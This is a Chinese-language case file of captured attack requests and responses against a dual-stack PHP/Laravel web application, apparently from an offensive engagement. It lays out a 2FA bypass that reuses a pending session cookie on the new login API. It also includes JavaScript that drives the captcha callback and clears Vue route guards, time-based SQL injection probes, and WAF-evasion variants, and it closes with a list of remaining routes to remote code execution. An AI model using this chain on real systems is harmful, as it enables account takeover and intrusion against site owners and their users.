# 双栈 PHP/Laravel 案例 · 实测请求与响应（2026-10，已脱敏）

> 配套 `spa-auth-gate-bypass`。适用：新栈 Laravel 13.x / PHP 8.4 代理老栈 PHP 7.2 + Apache mod_php；老栈 `/request/user.php` 用 `type=` 分发。

## 1. 一句话链

老栈 `type=login`（**明文**密码 + captcha token）→ `code:100` 2FA → **同一 PHPSESSID 当 `user_cookie`** 打新栈 `/api/v1/auth/login` → `200` + `deckclient_auth_token`（2FA 未完成也发）→ 清 Vue 路由守卫进 dashboard → 老栈数据接口全通。

## 2. 新栈登录（签名 + PHPSESSID）

```http
POST /api/v1/auth/login
Content-Type: application/json
X-Client-Timestamp: <ms>
X-Client-Body-SHA256: <sha256(body)>
X-Client-Sign: hmac_sha256(secret, ts + "\n" + method + "\n" + path + "\n" + bodyhash)

{"user_name":"<email>","password":"<plain>","device_name":"vue2-web","fingerprints_md5":"<md5>","user_cookie":"<PHPSESSID>"}
```

```json
{"code":200,"data":{"token_type":"Cookie","csrf_header":"X-CSRF-TOKEN",
 "userinfo":[{"id":"<uid>","user_name":"<email>","user_type":"2","login_2fa":"0",
  "google_checking_status":"0","agent":"<invite>","is_agent":"0"}],
 "user":{"id":<uid>,"user_name":"<email>","status":"Active"}}}
```
- 响应 `Set-Cookie: deckclient_auth_token=...; Domain=.example.com` + `deckclient_csrf_token`。
- `user_cookie` 空/无效 → 403 `Login information has expired`；PHPSESSID（pending 登录）→ 200。
- **`login_2fa:"0"` 与老栈 `code:100` 矛盾 = 2FA 只在老栈强制。**

## 3. 老栈（PHP 7.2.24 / Apache mod_php）

```http
POST /request/user.php
Content-Type: application/x-www-form-urlencoded

type=login_check_user_name&user_name=<email>
→ {"code":200,"message":"Success","data":[{"id":"<uid>","user_name":"<email>"}]}

type=login&user_name=<email>&password=<PLAINTEXT>&captcha_verify_param=<token>
→ {"code":100,"message":"Please finish the Two-factor authentication","data":""}
```
- `password=<md5>` → `Wrong password`；`password=<plain>` → `code:100`。
- 失败一次后 `Please try again later` = 计数锁（账号/IP）。

```http
type=internal_login&uid=<uid>&api_key=<hardcoded>&user_name=<email>&md5_password=<md5>&user_cookie=<ckey>&client_ip=127.0.0.1
→ 403 {"code":403,"message":"ip not permitted","data":{"ip":"<XFF or real>"}}
```
- XFF 可改 `data.ip` 回显，判定仍用 REMOTE_ADDR/上游代理 IP。

```http
type=get_email_code&code_type=login&user_name=<email>&captcha_verify_param=<token>
→ 403 "Email address has been registered"   # 注册验证码口，不是登录 2FA 发码口
```

## 4. 阿里云 captcha：组件 guard 回调

```js
const el = [...document.querySelectorAll('*')].find(e => e.__vue__);
let login = null;
(function walk(vm){ if(!vm) return; if(vm.$options.name==='Login') login=vm; (vm.$children||[]).forEach(walk); })(el.__vue__);
login.$refs.emailCodeCaptchaGuard.execute(function(param){ window.__capParam = param; });
// 点 #aliyunCaptcha-checkbox-icon 中心，等 7–8s → window.__capParam = {sceneId, certifyId, deviceToken}
```
- SDK 网络：`https://<prefix>.captcha-open-<region>.aliyuncs.com` 返回 `{"CertifyId":"...","Message":"success"}`。
- 弹窗可能一直停 "Please complete the captcha"，但 SDK 已成功、App 回调没发请求；以 `window.__capParam` 为准。
- 无效：`window.initAliyunCaptcha` setter / `add_init_script` wrapper / 篡改 SDK JS（会被函数声明或动态 JS 覆盖）。

## 5. 路由守卫绕过

```js
const el = [...document.querySelectorAll('*')].find(e => e.__vue__);
const root = el.__vue__.$root;
root.$router.beforeHooks.length = 0;
root.$router.push('/users/account');
```
- 只绕客户端；服务端仍校验 `deckclient_auth_token`。
- `location.hash` 可能停在 `#/pages/login`，但组件已渲染；看 `inner_text` / 网络。

## 6. 会话内先验（本案实测）

```http
type=get_account_setting_info&uid=1
→ 401 Login expired          # uid 先和 session 比对 → 数字型 SQLi 死

type=get_account_setting_info&uid=<uid> AND SLEEP(3)
→ 403 (CF ~5.5KB) / 405 (阿里云 WAF)
```

```http
type=add_fund_account&uid=<uid>&bank_name=...&account_name=...&account_number=...&credential=data:image/png;base64,<...>
→ {"code":200,"message":"Success","data":""}
type=get_fund_account&uid=<uid>
→ data:[{id,uid,account_name,account_number,bank_name,status:"Verifying"}]   # 无 URL/path
```
- `el-upload action=/request/user.php?type=add_fund_account` 是假上传：`auto-upload:false` + `getBase64()`，`credential` 是 base64 表单字段，**不落 webroot，不可能 RCE**。

## 7. WAF 分层判据（CF vs Apache/ModSecurity）

| 变形 | 返回 | 判定 |
|---|---|---|
| `PHP_SESSION_UPLOAD_PROGRESS` | 403 ~5.5KB CF 页 | CF WAF 命中 |
| `php_session_upload_progress` | 403 ~1.1KB Apache 页 | 过了 CF，被 Apache/ModSecurity 挡 |
| `PHP_SESSION_UPLOAD_PROGRESS\x00` | 403 ~5.5KB | CF 前缀匹配，null 无效 |

- 能过 CF ≠ 能触发：PHP `session.upload_progress.name` 匹配大小写敏感，小写不会触发 upload progress。

## 8. 诚实边界

- 本链产出用户会话/数据面，不等于 RCE；验收以 `whoami/id` 实际输出为准。
- 会话内无落盘上传时，RCE 剩：admin 真密码（同 PHPSESSID 绕过适用）、源站 IP、老 PHP CVE。
